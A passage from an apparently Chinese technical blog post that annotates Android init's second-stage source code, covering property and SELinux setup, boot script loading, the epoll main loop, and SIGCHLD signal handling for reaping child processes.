class="line"> </span><br><span class="line">    <span class="keyword">if</span> (GetMTKLOGDISABLERATELIMIT())</span><br><span class="line">        InitKernelLogging_split(argv);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        InitKernelLogging(argv);</span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">//在/dev目录下挂载好tmpfs以及kmsg</span></span><br><span class="line">    <span class="comment">//这样就可以初始化/kernel log系统，供用户打印log</span></span><br><span class="line">    InitKernelLogging(argv);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">&quot;init second stage started!&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Update $PATH in the case the second stage init is newer than first stage init, where it is</span></span><br><span class="line">    <span class="comment">// first set.</span></span><br><span class="line">    <span class="keyword">if</span> (setenv(<span class="string">&quot;PATH&quot;</span>, _PATH_DEFPATH, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        PLOG(FATAL) &lt;&lt; <span class="string">&quot;Could not set $PATH to &#x27;&quot;</span> &lt;&lt; _PATH_DEFPATH &lt;&lt; <span class="string">&quot;&#x27; in second stage&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Init should not crash because of a dependence on any other process, therefore we ignore</span></span><br><span class="line">    <span class="comment">// SIGPIPE and handle EPIPE at the call site directly.  Note that setting a signal to SIG_IGN</span></span><br><span class="line">    <span class="comment">// is inherited across exec, but custom signal handlers are not.  Since we do not want to</span></span><br><span class="line">    <span class="comment">// ignore SIGPIPE for child processes, we set a no-op function for the signal handler instead.</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">action</span> =</span> &#123;.sa_flags = SA_RESTART&#125;;</span><br><span class="line">        action.sa_handler = [](<span class="type">int</span>) &#123;&#125;;</span><br><span class="line">        sigaction(SIGPIPE, &amp;action, nullptr);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Set init and its forked children&#x27;s oom_adj.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> result =</span><br><span class="line">        WriteFile(<span class="string">&quot;/proc/1/oom_score_adj&quot;</span>, StringPrintf(<span class="string">&quot;%d&quot;</span>, DEFAULT_OOM_SCORE_ADJUST));</span><br><span class="line">        !result.ok()) &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; <span class="string">&quot;Unable to write &quot;</span> &lt;&lt; DEFAULT_OOM_SCORE_ADJUST</span><br><span class="line">            &lt;&lt; <span class="string">&quot; to /proc/1/oom_score_adj: &quot;</span> &lt;&lt; result.error();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Set up a session keyring that all processes will have access to. It</span></span><br><span class="line">    <span class="comment">// will hold things like FBE encryption keys. No process should override</span></span><br><span class="line">    <span class="comment">// its session keyring.</span></span><br><span class="line">    <span class="comment">//01.创建进程会话密钥并初始化属性系统</span></span><br><span class="line">    keyctl_get_keyring_ID(KEY_SPEC_SESSION_KEYRING, <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Indicate that booting is in progress to background fw loaders, etc.</span></span><br><span class="line">    <span class="comment">//创建/dev/.booting文件，就是个标记，表示booting进行中</span></span><br><span class="line">    close(open(<span class="string">&quot;/dev/.booting&quot;</span>, O_WRONLY | O_CREAT | O_CLOEXEC, <span class="number">0000</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// See if need to load debug props to allow adb root, when the device is unlocked.</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* force_debuggable_env = getenv(<span class="string">&quot;INIT_FORCE_DEBUGGABLE&quot;</span>);</span><br><span class="line"><span class="type">bool</span> load_debug_prop = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (force_debuggable_env &amp;&amp; AvbHandle::IsDeviceUnlocked()) &#123;</span><br><span class="line">load_debug_prop = <span class="string">&quot;true&quot;</span>s == force_debuggable_env;</span><br><span class="line">&#125;</span><br><span class="line">unsetenv(<span class="string">&quot;INIT_FORCE_DEBUGGABLE&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Umount the debug ramdisk so property service doesn&#x27;t read .prop files from there, when it</span></span><br><span class="line"><span class="comment">// is not meant to.</span></span><br><span class="line"><span class="keyword">if</span> (!load_debug_prop) &#123;</span><br><span class="line">UmountDebugRamdisk();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//初始化属性系统，并从指定文件读取属性</span></span><br><span class="line">PropertyInit();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Umount second stage resources after property service has read the .prop files.</span></span><br><span class="line">UmountSecondStageRes();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Umount the debug ramdisk after property service has read the .prop files when it means to.</span></span><br><span class="line"><span class="keyword">if</span> (load_debug_prop) &#123;</span><br><span class="line">UmountDebugRamdisk();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Mount extra filesystems required during second stage init</span></span><br><span class="line">MountExtraFilesystems();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Now set up SELinux for second stage.</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> MTK_LOG</span></span><br><span class="line"><span class="keyword">if</span> (GetMTKLOGDISABLERATELIMIT())</span><br><span class="line">SelinuxSetupKernelLogging_split();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">SelinuxSetupKernelLogging();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">SelinuxSetupKernelLogging();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">SelabelInitialize();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">02.进行SELinux第二阶段并恢复一些文件安全上下文</span></span><br><span class="line"><span class="comment">恢复相关文件的安全上下文，因为这些文件是在SELinux安全机制初始化前创建的</span></span><br><span class="line"><span class="comment">所以需要重新恢复上下文</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">SelinuxRestoreContext();</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">03.新建epoll并初始化子进程终止信号处理函数</span></span><br><span class="line"><span class="comment">创建epoll实例，并返回epoll的文件描述</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Epoll epoll;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">auto</span> result = epoll.Open(); !result.ok()) &#123;</span><br><span class="line">PLOG(FATAL) &lt;&lt; result.error();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> G1122717</span></span><br><span class="line"><span class="comment">// Watch properties with specific meanings to init.</span></span><br><span class="line">LOG(INFO) &lt;&lt; <span class="string">&quot;Apply watching properties with specific meanings to init.&quot;</span>;</span><br><span class="line">ActionManager::GetInstance().StartWatchingProperty(<span class="string">&quot;sys.powerctl&quot;</span>);</span><br><span class="line">ActionManager::GetInstance().StartWatchingProperty(<span class="string">&quot;ro.persistent_properties.ready&quot;</span>);</span><br><span class="line">ActionManager::GetInstance().StartWatchingProperty(kColdBootDoneProp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">主要是创建handler处理子进程终止信号，注册一个signal到epoll进行监听</span></span><br><span class="line"><span class="comment">进行子继承处理</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">InstallSignalFdHandler(&amp;epoll);</span><br><span class="line">InstallInitNotifier(&amp;epoll);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//04.设置其他系统属性并开启系统属性服务</span></span><br><span class="line">StartPropertyService(&amp;property_fd);</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(MTK_LOG) &amp;&amp; defined(MTK_COMMAND_WDOG)</span></span><br><span class="line">ActionManager::GetInstance().StartCommandWDOG();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Make the time that init stages started available for bootstat to log.</span></span><br><span class="line">RecordStageBoottimes(start_time);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Set libavb version for Framework-only OTA match in Treble build.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="type">const</span> <span class="type">char</span>* avb_version = getenv(<span class="string">&quot;INIT_AVB_VERSION&quot;</span>); avb_version != nullptr) &#123;</span><br><span class="line">SetProperty(<span class="string">&quot;ro.boot.avb_version&quot;</span>, avb_version);</span><br><span class="line">&#125;</span><br><span class="line">unsetenv(<span class="string">&quot;INIT_AVB_VERSION&quot;</span>);</span><br><span class="line"> </span><br><span class="line">fs_mgr_vendor_overlay_mount_all();</span><br><span class="line">export_oem_lock_status();</span><br><span class="line">MountHandler <span class="title function_">mount_handler</span><span class="params">(&amp;epoll)</span>;</span><br><span class="line">SetUsbController();</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> JOURNEY_FEATURE_SECURE</span></span><br><span class="line">CheckJourneySecureMode();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> BuiltinFunctionMap&amp; function_map = GetBuiltinFunctionMap();</span><br><span class="line">Action::set_function_map(&amp;function_map);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (!SetupMountNamespaces()) &#123;</span><br><span class="line">PLOG(FATAL) &lt;&lt; <span class="string">&quot;SetupMountNamespaces failed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//初始化文件上下文</span></span><br><span class="line">InitializeSubcontext();</span><br><span class="line"> </span><br><span class="line">ActionManager&amp; am = ActionManager::GetInstance();</span><br><span class="line">ServiceList&amp; sm = ServiceList::GetInstance();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">05.解析init.rc等文件，建立rc文件的action、service，启动其他进程</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LoadBootScripts(am, sm);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Turning this on and letting the INFO logging be discarded adds 0.2s to</span></span><br><span class="line"><span class="comment">// Nexus 9 boot time, so it&#x27;s disabled by default.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) DumpState();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Make the GSI status available before scripts start running.</span></span><br><span class="line"><span class="comment">//当GSI脚本running时，确保GSI状态可用</span></span><br><span class="line"><span class="keyword">auto</span> is_running = android::gsi::IsGsiRunning() ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>;</span><br><span class="line">SetProperty(gsi::kGsiBootedProp, is_running);</span><br><span class="line"><span class="keyword">auto</span> is_installed = android::gsi::IsGsiInstalled() ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>;</span><br><span class="line">SetProperty(gsi::kGsiInstalledProp, is_installed);</span><br><span class="line"> </span><br><span class="line">am.QueueBuiltinAction(SetupCgroupsAction, <span class="string">&quot;SetupCgroups&quot;</span>);</span><br><span class="line">am.QueueBuiltinAction(SetKptrRestrictAction, <span class="string">&quot;SetKptrRestrict&quot;</span>);</span><br><span class="line">am.QueueBuiltinAction(TestPerfEventSelinuxAction, <span class="string">&quot;TestPerfEventSelinux&quot;</span>);</span><br><span class="line"><span class="comment">//执行rc文件中触发器为 on early-init的语句</span></span><br><span class="line">am.QueueEventTrigger(<span class="string">&quot;early-init&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Queue an action that waits for coldboot done so we know ueventd has set up all of /dev...</span></span><br><span class="line"><span class="comment">//等冷插拔设备初始化完成</span></span><br><span class="line">am.QueueBuiltinAction(wait_for_coldboot_done_action, <span class="string">&quot;wait_for_coldboot_done&quot;</span>);</span><br><span class="line"><span class="comment">// ... so that we can start queuing up actions that require stuff from /dev.</span></span><br><span class="line">am.QueueBuiltinAction(SetMmapRndBitsAction, <span class="string">&quot;SetMmapRndBits&quot;</span>);</span><br><span class="line"><span class="comment">//设备组合键的初始化操作</span></span><br><span class="line">Keychords keychords;</span><br><span class="line">am.QueueBuiltinAction(</span><br><span class="line">[&amp;epoll, &amp;keychords](<span class="type">const</span> BuiltinArguments&amp; args) -&gt; Result&lt;<span class="type">void</span>&gt; &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; svc : ServiceList::GetInstance()) &#123;</span><br><span class="line">keychords.Register(svc-&gt;keycodes());</span><br><span class="line">&#125;</span><br><span class="line">keychords.Start(&amp;epoll, HandleKeychord);</span><br><span class="line"><span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;KeychordInit&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Trigger all the boot actions to get us started.</span></span><br><span class="line"><span class="comment">//执行rc文件中触发器为on init的语句</span></span><br><span class="line">am.QueueEventTrigger(<span class="string">&quot;init&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Don&#x27;t mount filesystems or start core system services in charger mode.</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当设备处于充电模式时，不需要mount文件系统或者启动系统服务</span></span><br><span class="line"><span class="comment">充电模式下，将charger加入执行队列，否则把late-init加入执行队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> bootmode = GetProperty(<span class="string">&quot;ro.bootmode&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (bootmode == <span class="string">&quot;charger&quot;</span>) &#123;</span><br><span class="line">am.QueueEventTrigger(<span class="string">&quot;charger&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">am.QueueEventTrigger(<span class="string">&quot;late-init&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Run all property triggers based on current state of the properties.</span></span><br><span class="line"><span class="comment">//基于属性当前状态，运行所有的属性触发器</span></span><br><span class="line">am.QueueBuiltinAction(queue_property_triggers_action, <span class="string">&quot;queue_property_triggers&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Restore prio before main loop</span></span><br><span class="line">setpriority(PRIO_PROCESS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// By default, sleep until something happens.</span></span><br><span class="line"><span class="keyword">auto</span> epoll_timeout = <span class="built_in">std</span>::optional&lt;<span class="built_in">std</span>::chrono::milliseconds&gt;&#123;&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> shutdown_command = shutdown_state.CheckShutdown();</span><br><span class="line"><span class="keyword">if</span> (shutdown_command) &#123;</span><br><span class="line">LOG(INFO) &lt;&lt; <span class="string">&quot;Got shutdown_command &#x27;&quot;</span> &lt;&lt; *shutdown_command</span><br><span class="line">&lt;&lt; <span class="string">&quot;&#x27; Calling HandlePowerctlMessage()&quot;</span>;</span><br><span class="line">HandlePowerctlMessage(*shutdown_command);</span><br><span class="line">shutdown_state.set_do_shutdown(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//依次执行每个action中携带command对应的执行函数</span></span><br><span class="line"><span class="keyword">if</span> (!(prop_waiter_state.MightBeWaiting() || Service::is_exec_service_running())) &#123;</span><br><span class="line">am.ExecuteOneCommand();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!IsShuttingDown()) &#123;</span><br><span class="line"><span class="keyword">auto</span> next_process_action_time = HandleProcessActions();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// If there&#x27;s a process that needs restarting, wake up in time for that.</span></span><br><span class="line"><span class="keyword">if</span> (next_process_action_time) &#123;</span><br><span class="line">epoll_timeout = <span class="built_in">std</span>::chrono::<span class="built_in">ceil</span>&lt;<span class="built_in">std</span>::chrono::milliseconds&gt;(</span><br><span class="line">*next_process_action_time - boot_clock::now());</span><br><span class="line"><span class="keyword">if</span> (*epoll_timeout &lt; <span class="number">0</span>ms) epoll_timeout = <span class="number">0</span>ms;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (!(prop_waiter_state.MightBeWaiting() || Service::is_exec_service_running())) &#123;</span><br><span class="line"><span class="comment">// If there&#x27;s more work to do, wake up again immediately.</span></span><br><span class="line"><span class="keyword">if</span> (am.HasMoreCommands()) epoll_timeout = <span class="number">0</span>ms;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> MTK_LOG</span></span><br><span class="line"><span class="type">int</span> log_ms = _LogReap();<span class="comment">//PropSetLogReap();</span></span><br><span class="line"><span class="keyword">if</span> (log_ms &gt; <span class="number">-1</span> &amp;&amp; (!epoll_timeout || epoll_timeout-&gt;count() &gt; log_ms))</span><br><span class="line">epoll_timeout = <span class="built_in">std</span>::chrono::milliseconds(log_ms);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (GetMTKLOGDISABLERATELIMIT()) &#123;</span><br><span class="line"><span class="keyword">if</span> (!Getwhilepiggybacketed(<span class="number">1</span>) &amp;&amp; Getwhileepduration(<span class="number">1</span>) &gt; <span class="number">1999</span>)</span><br><span class="line">LOG(INFO) &lt;&lt; <span class="string">&quot;Lastest epoll wait tooks &quot;</span> &lt;&lt; Getwhileepduration(<span class="number">1</span>) &lt;&lt; <span class="string">&quot;ms&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">android::base::Timer t;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> pending_functions = epoll.Wait(epoll_timeout);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (GetMTKLOGDISABLERATELIMIT()) &#123;</span><br><span class="line"><span class="type">uint64_t</span> duration = t.duration().count();</span><br><span class="line"><span class="type">uint64_t</span> nowms = <span class="built_in">std</span>::chrono::duration_cast&lt;<span class="built_in">std</span>::chrono::milliseconds&gt;(boot_clock::now().time_since_epoch()).count();</span><br><span class="line">Setwhiletime(<span class="number">1</span>, duration, nowms);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">auto</span> pending_functions = epoll.Wait(epoll_timeout);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (!pending_functions.ok()) &#123;</span><br><span class="line">LOG(ERROR) &lt;&lt; pending_functions.error();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!pending_functions-&gt;empty()) &#123;</span><br><span class="line"><span class="comment">// We always reap children before responding to the other pending functions. This is to</span></span><br><span class="line"><span class="comment">// prevent a race where other daemons see that a service has exited and ask init to</span></span><br><span class="line"><span class="comment">// start it again via ctl.start before init has reaped it.</span></span><br><span class="line">ReapAnyOutstandingChildren();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; function : *pending_functions) &#123;</span><br><span class="line">(*function)();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!IsShuttingDown()) &#123;</span><br><span class="line">HandleControlMessages();</span><br><span class="line">SetUsbController();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="信号处理"><a href="#信号处理" class="headerlink" title="信号处理"></a>信号处理</h3><p>init是一个守护进程，为了防止init的子进程成为僵尸进程(zombie process)，需要init在子进程在结束时获取子进程的结束码，通过结束码将程序表中的子进程移除，防止成为僵尸进程的子进程占用程序表的空间（程序表的空间达到上限时，系统就不能再启动新的进程了，会引起严重的系统问题）。</p><p><strong>信号处理主要工作：</strong></p><ul><li>初始化信号signal句柄</li><li>循环处理子进程</li><li>注册epoll句柄</li><li>处理子进程终止</li></ul><p>注:EPOLL类似于POLL，是Linux中用来做事件触发的，跟EventBus功能差不多。linux很长的时间都在使用select来做事件触发，它是通过轮询来处理的，轮询的fd数目越多，自然耗时越多，对于大量的描述符处理，EPOLL更有优势</p><p><strong>InstallSignalFdHandler</strong></p><p>在linux当中，父进程是通过捕捉SIGCHLD信号来得知子进程运行结束的情况，SIGCHLD信号会在子进程终止的时候发出，了解这些背景后，我们来看看init进程如何处理这个信号。</p><ol><li>新建一个sigaction结构体，sa_handler是信号处理函数，指向内核指定的函数指针SIG_DFL和Android 9.0及之前的版本不同，这里不再通过socket的读写句柄进行接收信号，改成了内核的信号处理函数SIG_DFL。</li><li>sigaction(SIGCHLD, &amp;act, nullptr) 这个是建立信号绑定关系，也就是说当监听到SIGCHLD信号时，由act这个sigaction结构体处理</li><li>RegisterHandler 的作用就是signal_read_fd（之前的s[1]）收到信号，触发handle_signal</li></ol><p>终上所述，InstallSignalFdHandler函数的作用就是，接收到SIGCHLD信号时触发HandleSignalFd进行信号处理</p><p>信号处理示意图：</p><p><img src="/images/20240225/20240225001.png"></p><p><strong>system/core/init/init.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">InstallSignalFdHandler</span><span class="params">(Epoll* epoll)</span> &#123;</span><br><span class="line">    <span class="comment">//SA_NOCLDSTOP使init进程只有在其进程终止时才会受到SIGCHLD信号</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span> &#123;</span> .sa_handler = SIG_DFL, .sa_flags = SA_NOCLDSTOP &#125;;</span><br><span class="line">    sigaction(SIGCHLD, &amp;act, nullptr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGCHLD);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!IsRebootCapable()) &#123;</span><br><span class="line">        <span class="comment">//如果init不具备CAP_SYS_BOOT的能力，则它此时正值容器中运行</span></span><br><span class="line">        <span class="comment">//在这种场景下，接收SIGTERM将会导致系统关闭</span></span><br><span class="line">        sigaddset(&amp;mask, SIGTERM);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (sigprocmask(SIG_BLOCK, &amp;mask, nullptr) == <span class="number">-1</span>) &#123;</span><br><span class="line">        PLOG(FATAL) &lt;&lt; <span class="string">&quot;failed to block signals&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//注册处理程序以解除对子进程中的信号的阻止</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> result = pthread_atfork(nullptr, nullptr, &amp;UnblockSignals);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">        LOG(FATAL) &lt;&lt; <span class="string">&quot;Failed to register a fork handler: &quot;</span> &lt;&lt; strerror(result);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//创建信号句柄</span></span><br><span class="line">    signal_fd = signalfd(<span class="number">-1</span>, &amp;mask, SFD_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (signal_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        PLOG(FATAL) &lt;&lt; <span class="string">&quot;failed to create signalfd&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//信号注册，当signal_fd收到信号时，触发HandlerSignalFd</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> result = epoll-&gt;RegisterHandler(signal_fd, HandleSignalFd); !result.ok()) &#123;</span><br><span class="line">        LOG(FATAL) &lt;&lt; result.error();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>RegisterHandler</strong><br>说明：信号注册，把fd句柄加入到epoll_fd_的监听队列中<br><strong>system/core/init/epoll.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Result&lt;<span class="type">void</span>&gt; <span class="title function_">Epoll::RegisterHandler</span><span class="params">(<span class="type">int</span> fd, Handler handler, <span class="type">uint32_t</span> events)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!events) &#123;</span><br><span class="line">        <span class="keyword">return</span> Error() &lt;&lt; <span class="string">&quot;Must specify events&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> sp = <span class="built_in">std</span>::make_shared&lt;decltype(handler)&gt;(<span class="built_in">std</span>::move(handler));</span><br><span class="line">    <span class="keyword">auto</span> [it, inserted] = epoll_handlers_.emplace(fd, <span class="built_in">std</span>::move(sp));</span><br><span class="line">    <span class="keyword">if</span> (!inserted) &#123;</span><br><span class="line">        <span class="keyword">return</span> Error() &lt;&lt; <span class="string">&quot;Cannot specify two epoll handlers for a given FD&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    epoll_event ev;</span><br><span class="line">    ev.events = events;</span><br><span class="line">    <span class="comment">// std::map&#x27;s iterators do not get invalidated until erased, so we use the</span></span><br><span class="line">    <span class="comment">// pointer to the std::function in the map directly for epoll_ctl.</span></span><br><span class="line">    ev.data.ptr = reinterpret_cast&lt;<span class="type">void</span>*&gt;(&amp;it-&gt;second);</span><br><span class="line">    <span class="comment">//将fd的可读事件加入到epoll_fd_的监听队列中</span></span><br><span class="line">    <span class="keyword">if</span> (epoll_ctl(epoll_fd_, EPOLL_CTL_ADD, fd, &amp;ev) == <span class="number">-1</span>) &#123;</span><br><span class="line">        Result&lt;<span class="type">void</span>&gt; result = ErrnoError() &lt;&lt; <span class="string">&quot;epoll_ctl failed to add fd&quot;</span>;</span><br><span class="line">        epoll_handlers_.erase(fd);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>HandlerSignalFd</strong><br>说明：监控SIGCHLD信号，调用ReapAnyOutstadingChildren来终止出现问题的子进程<br><strong>system/core/init/init.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">HandleSignalFd</span><span class="params">()</span> &#123;</span><br><span class="line">    signalfd_siginfo siginfo;</span><br><span class="line">    <span class="type">ssize_t</span> bytes_read = TEMP_FAILURE_RETRY(read(signal_fd, &amp;siginfo, <span class="keyword">sizeof</span>(siginfo)));</span><br><span class="line">    <span class="keyword">if</span> (bytes_read != <span class="keyword">sizeof</span>(siginfo)) &#123;</span><br><span class="line">        PLOG(ERROR) &lt;&lt; <span class="string">&quot;Failed to read siginfo from signal_fd&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//监控SIGCHLD信号</span></span><br><span class="line">    <span class="keyword">switch</span> (siginfo.ssi_signo) &#123;</span><br><span class="line">        <span class="keyword">case</span> SIGCHLD:</span><br><span class="line">            ReapAnyOutstandingChildren();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SIGTERM:</span><br><span class="line">            HandleSigtermSignal(siginfo);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            PLOG(ERROR) &lt;&lt; <span 